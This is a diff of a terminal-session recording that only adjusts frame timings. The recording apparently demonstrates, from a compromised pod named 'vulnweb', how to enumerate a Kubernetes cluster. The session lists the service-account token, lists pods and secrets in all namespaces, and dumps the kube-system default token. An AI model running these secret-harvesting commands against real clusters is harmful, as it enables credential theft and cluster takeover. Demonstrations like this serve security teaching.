@@ -15,7 +15,7 @@
       "\u001b[?1034h\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
     ],
     [
-      0.5,
+      0.2,
       "apt-get update -q && DEBIAN_FRONTEND=noninteractive apt-get install -qy jq iputils-ping \rnmap vim python-pip groff-base tcpd"
     ],
     [
@@ -27,7 +27,7 @@
       "\r\n"
     ],
     [
-      1.260024,
+      0.160024,
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
@@ -35,11 +35,11 @@
       "\r\n"
     ],
     [
-      1.260024,
+      0.160024,
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      0.396998,
+      0.696998,
       "curl -sLO https://storage.googleapis.com/kubernetes-re"
     ],
     [
@@ -63,7 +63,7 @@
       "x kubectl && mv kubectl /usr/local/bin"
     ],
     [
-      1.486401,
+      1.886401,
       "\r\n"
     ],
     [
@@ -99,11 +99,11 @@
       "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      0.563192,
+      0.263192,
       "curl -sk https://$KUBERNETES_PORT_443_TCP_ADDR:443"
     ],
     [
-      0.271537,
+      0.471537,
       "\r\n"
     ],
     [
@@ -115,11 +115,11 @@
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.0,
+      0.5,
       "ls -al /var/run/secrets/kubernetes.io/serviceaccount"
     ],
     [
-      0.714664,
+      0.814664,
       "\r\n"
     ],
     [
@@ -127,11 +127,11 @@
       "total 4\r\ndrwxrwxrwt 3 root root  140 Oct 26 04:00 .\r\ndrwxr-xr-x 3 root root 4096 Oct 26 04:01 ..\r\ndrwxr-xr-x 2 root root  100 Oct 26 04:00 ..109810_26_10_04_00_56.269970912\r\nlrwxrwxrwx 1 root root   33 Oct 26 04:00 ..data -> ..109810_26_10_04_00_56.269970912\r\nlrwxrwxrwx 1 root root   13 Oct 26 04:00 ca.crt -> ..data/ca.crt\r\nlrwxrwxrwx 1 root root   16 Oct 26 04:00 namespace -> ..data/namespace\r\nlrwxrwxrwx 1 root root   12 Oct 26 04:00 token -> ..data/token\r\nroot@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.0,
+      0.7,
       "kubectl get pods --all-namespaces"
     ],
     [
-      0.353359,
+      0.853359,
       "\r\n"
     ],
     [
@@ -151,11 +151,11 @@
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.0,
+      0.5,
       "kubectl get secrets --all-namespaces"
     ],
     [
-      0.335728,
+      0.835728,
       "\r\n"
     ],
     [
@@ -179,11 +179,11 @@
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      1.0,
+      0.4,
       "kubectl get secrets --all-namespaces | grep default"
     ],
     [
-      0.310048,
+      0.610048,
       "\r\n"
     ],
     [
@@ -195,7 +195,7 @@
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      1.0,
+      0.3,
       "kubectl get secret -n kube-system def"
     ],
     [
@@ -203,7 +203,7 @@
       "ault-token-ww2zp -o  \ryaml"
     ],
     [
-      0.324699,
+      0.424699,
       "\r\n"
     ],
     [
